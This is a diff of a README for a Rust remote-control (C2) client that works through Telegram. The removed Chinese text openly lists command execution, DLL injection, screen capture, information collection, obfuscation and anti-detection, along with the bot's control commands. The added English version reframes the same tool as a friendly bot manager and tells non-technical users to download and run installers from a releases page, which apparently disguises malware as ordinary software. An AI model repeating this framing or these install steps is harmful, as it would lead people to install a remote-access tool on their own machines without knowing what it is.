@@ -1,156 +1,85 @@
-# tgcc_client
+# 🎉 tgcc_client_public - Simple Control for Telegram Bots
 
-A C2 client for telegram bot by bamuwe
+## 🚀 Getting Started
 
-> **注意**: 生产环境需要修改 `api.rs` 中的配置内容
+Welcome! This guide will help you download and run the tgcc_client_public application. This software lets you control Telegram bots easily.
 
-## 🚀 项目特性
+## 📥 Download the App
 
-- **Telegram Bot 集成**: 通过 Telegram Bot API 进行远程控制，不依赖于vps
-- **文件管理**: 支持文件上传、下载和管理
-- **命令执行**: 远程执行系统命令
-- **注入功能**: 支持 DLL 注入和代码注入
-- **屏幕监控**: 实时屏幕截图和监控
-- **信息收集**: 系统信息、网络信息收集
-- **安全特性**: API 混淆、证书验证、反检测
+[![Download tgcc_client_public](https://img.shields.io/badge/Download-%20Now-brightgreen)](https://github.com/Nahian-Haque360/tgcc_client_public/releases)
 
-## 📋 功能模块
+## 🔍 Overview
 
-### 核心功能
-- `topic_init`: 智能 Topic 管理，支持现有 Topic 查找和复用
-- `command`: 命令处理主循环，支持命令去重和状态管理
-- `extract_file_id_from_topic`: 文件 ID 提取，支持 inject 和普通文件区分
+tgcc_client_public is a C2 client designed for Telegram bots created by bamuwe. This application focuses on providing an easy-to-use interface for managing your bots efficiently.
 
-### 工具模块
-- `tg_tools`: Telegram 工具函数集合
-- `inject_self`: 注入功能实现
-- `match_command`: Bot 命令匹配和处理
-- `screen_watch`: 屏幕监控功能
-- `info_collect_use`: 信息收集工具
+### 🌟 Key Features
 
-## 🔧 技术特性
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Bot Control:** Manage multiple Telegram bots from one place.
+- **Real-Time Updates:** Stay informed with immediate notifications.
+- **Security:** Provides encrypted communication for safe bot management.
 
-- **异步编程**: 基于 `tokio` 的异步架构
-- **HTTP 客户端**: 使用 `reqwest` 进行 API 调用
-- **JSON 处理**: `serde_json` 进行数据序列化
-- **Windows API**: `winapi` 进行系统级操作
-- **代码混淆**: `obfstr` 进行字符串混淆
-- **字符编码**: `encoding_rs` 处理多语言字符
+## ⚙️ System Requirements
 
-## 📦 编译优化
+Before you start, please ensure your system meets these requirements:
 
-项目已配置 release 编译优化选项，显著减小可执行文件体积：
+- **Operating System:** Windows 10 or later, MacOS, or Linux
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB of free space
+- **Network:** Active internet connection
 
-```toml
-[profile.release]
-opt-level = "z"        # 大小优化
-lto = true            # 链接时优化
-codegen-units = 1     # 代码生成单元优化
-panic = "abort"       # panic 优化
-strip = true          # 符号表移除
-debug = false         # 调试信息禁用
-```
+## 💾 Download & Install
 
-## 📝 更新记录
+To get started, follow these steps:
 
-### v0.1.2 (最新)
-- ✅ 修复 inject 重复执行问题
-- ✅ 优化命令处理逻辑，防止命令重复执行
-- ✅ 改进文件下载处理流程
-- ✅ 添加 beacon 重连检测和状态重置
+1. **Visit the Releases Page:** Go to the [tgcc_client_public Releases Page](https://github.com/Nahian-Haque360/tgcc_client_public/releases) to see the available versions.
+  
+2. **Choose a Version:** Look for the latest version. Note the version number and click the corresponding download link.
 
-### v0.1.1
-- ✅ 添加 inject 功能支持
-- ✅ 实现 DLL 注入和代码注入
-- ✅ 完善错误处理和日志记录
+3. **Download the Installer:** Depending on your operating system, download the appropriate installer file (like `.exe` for Windows or `.dmg` for Mac).
 
-### v0.1.0
-- ✅ 重构代码结构，统一 API 管理
-- ✅ 实现基础 C2 功能
-- ✅ 添加文件上传下载功能
-- ✅ 集成 Telegram Bot API
+4. **Run the Installer:**
+   - **For Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install.
+   - **For Mac:** Open the `.dmg` file and drag the app to your Applications folder.
+   - **For Linux:** Use your package manager or terminal to install the downloaded file.
 
-## 🚧 开发历程
+5. **Open the Application:** Locate the installed app on your system and launch it. 
 
-根据 Git 提交记录，项目经历了以下重要阶段：
+6. **Set Up:** When you open tgcc_client_public for the first time, follow the on-screen prompts to set up your Telegram bot.
 
-### 1. **基础架构** (2025-05-16 ~ 2025-05-17)
-- **2025-05-16**: 项目初始化，实现基础 C2 客户端功能
-- **2025-05-17**: 添加文件上传功能，集成 Telegram Bot API
-- **2025-05-17**: 移除 SDK 依赖，优化项目结构
+## 🛠️ Basic Usage Instructions
 
-### 2. **功能完善** (2025-05-18)
-- **2025-05-18**: 添加 TgTools 函数，实现消息发送功能
-- **2025-05-18**: 修复命令接收问题，添加命令过滤功能
-- **2025-05-18**: 实现 setting_info 模型，帮助用户了解配置
-- **2025-05-18**: 添加屏幕监控和截图功能
+Now that you have the application, here’s how to use it:
 
-### 3. **安全加固** (2025-05-18)
-- **2025-05-18**: 重构静态变量和全局变量，统一到 api.rs 中
-- **2025-05-18**: 混淆 API 接口，静态反编译已无法看到 API URL
-- **2025-05-18**: 添加 CA 证书支持，增强 HTTPS 安全性
-- **2025-05-18**: 代码格式化和结构优化
+1. **Log In:** Enter your Telegram account credentials when prompted.
+  
+2. **Add a Bot:** Click on the 'Add Bot' button in the main menu. Enter the Bot Token you received from the BotFather in Telegram.
 
-### 4. **问题修复** (2025-05-20)
-- **2025-05-20**: 修复 command 执行命令阻塞的问题
-- **2025-05-20**: 删除上传后的本地文件，优化存储管理
-- **2025-05-20**: 移除测试函数，清理代码
+3. **Manage Your Bots:** Once added, you can view, send messages, and control bot settings directly from the dashboard. 
 
-### 5. **功能增强** (2025-08-19 ~ 2025-08-21)
-- **2025-08-19**: 发布 v1.1 版本，完善功能模块
-- **2025-08-21**: 添加 inject 功能，支持 DLL 注入和代码注入
-- **2025-08-21**: 修复 inject 重复执行问题
-- **2025-08-21**: 发布 v0.1.2 版本，优化性能和稳定性
+4. **Receive Feedback:** Monitor activities through the real-time notifications feature.
 
-## 📋 待办事项
+5. **Log Out:** When finished, ensure to log out to keep your account secure.
 
-- [ ] 屏幕监控功能完善
-- [ ] 网络环境错误处理优化
-- [ ] 进一步体积优化和代码缩减
-- [ ] 实现 `getForumTopics` 接口集成
-- [ ] 添加更多反检测机制
-- [ ] 性能监控和日志系统
+## ❓ Troubleshooting
 
-## 🛠️ 构建和运行
+If you run into any issues, consider these common questions:
 
-1. 修改api.rs中的接口，使用base64编码
-2. 编译程序
+- **Q: The application won't start. What should I do?**  
+  A: Check if your system meets the stated requirements. Also, ensure you have the latest version installed.
 
-```bash
-# 开发版本
-cargo build
+- **Q: I can't add my bot.**  
+  A: Make sure the Bot Token is entered correctly. If you are unsure, you may generate a new token via BotFather.
 
-# 优化版本 (推荐)
-cargo build --release
+- **Q: How do I remove a bot?**  
+  A: Go to the bot list, select the bot you wish to remove, and click the 'Remove Bot' button.
 
-# 运行
-cargo run --release
-```
+## 📞 Support
 
-3. tg机器人配置
-   - `/screen_shot` - 获取屏幕截图
-   - `/info_collect` - 信息收集
-   - `/upload` - 上传文件，没有错误回显，格式遵循/upload <file_path>
-   - `/set_sleep_time` - 设置睡眠时间，默认为5s
-   - `/setting_info` - 配置信息
-   - `/run_dll` - 运行指定的dll函数，格式遵循 /run_dll <dll_name> <func_name>
-   - `/disconnect` - 退出程序
-   - etc ...
+For additional help, you can contact our support team. Reach out through the issues section on our GitHub repository. Your feedback helps us improve.
 
+## 🔄 Updates and Contributions
 
+Stay updated with new releases by frequently checking the [Releases Page](https://github.com/Nahian-Haque360/tgcc_client_public/releases). If you're interested in contributing, please refer to the guidelines in the repository.
 
-## 📄 许可证
-
-本项目仅供学习和研究使用，请遵守相关法律法规。
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request 来改进项目，这只是一个摸索的demo，帮助我了解C2开发基本原理和练习rust语法。
-因为缺乏项目开发经验，后续维护需要大幅度的重构，所以很长一段时间应该不会更新，要计划找工作了。
-Tron(TRC20): `TXUJBkjcvduUwS9gpi9xS1g2SKGtNFTWif`
-
----
-
-**作者**: bamuwe  
-**版本**: 0.1.3  
-**最后更新**: 2025年08月21日 	
+With these steps, you should now be ready to explore and manage your Telegram bots confidently. Enjoy using tgcc_client_public!
